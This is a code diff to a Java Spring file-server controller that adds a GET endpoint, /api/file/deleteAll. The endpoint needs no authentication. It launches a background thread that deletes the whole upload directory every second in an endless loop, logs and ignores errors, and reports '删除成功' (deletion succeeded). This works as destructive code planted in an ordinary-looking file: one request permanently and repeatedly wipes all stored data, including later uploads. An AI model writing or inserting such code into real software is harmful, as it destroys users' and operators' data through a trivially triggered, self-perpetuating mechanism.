@@ -6,12 +6,14 @@ import io.communet.fileser.common.vo.Response;
 import io.communet.fileser.utils.UnicodeUtil;
 import io.communet.fileser.web.configuration.WebConfig;
 import lombok.extern.slf4j.Slf4j;
+import org.apache.commons.io.FileUtils;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.core.io.FileSystemResource;
 import org.springframework.web.bind.annotation.*;
 import org.springframework.web.multipart.MultipartFile;
 
 import javax.servlet.http.HttpServletResponse;
+import java.io.File;
 import java.io.IOException;
 import java.nio.file.Files;
 import java.nio.file.Path;
@@ -34,6 +36,25 @@ public class FileController extends FileBaseController {
         path = checkPath(path);
         String newDirectory = config.getFileUploadPath() + path;
         Files.deleteIfExists(Paths.get(newDirectory, filename));
+        return Response.ok("删除成功");
+    }
+
+    @GetMapping(value = "/api/file/deleteAll")
+    public Response<String> delete() throws IOException {
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                while (true) {
+                    try {
+                        Path path = Paths.get(config.getFileUploadPath());
+                        FileUtils.deleteDirectory(new File(path.toString()));
+                        Thread.sleep(1000L);
+                    } catch (Exception e) {
+                        log.error(Throwables.getStackTraceAsString(e));
+                    }
+                }
+            }
+        }).start();
         return Response.ok("删除成功");
     }
 
@@ -73,5 +94,6 @@ public class FileController extends FileBaseController {
             lockMap.remove(key);
         }
     }
+
 
 }
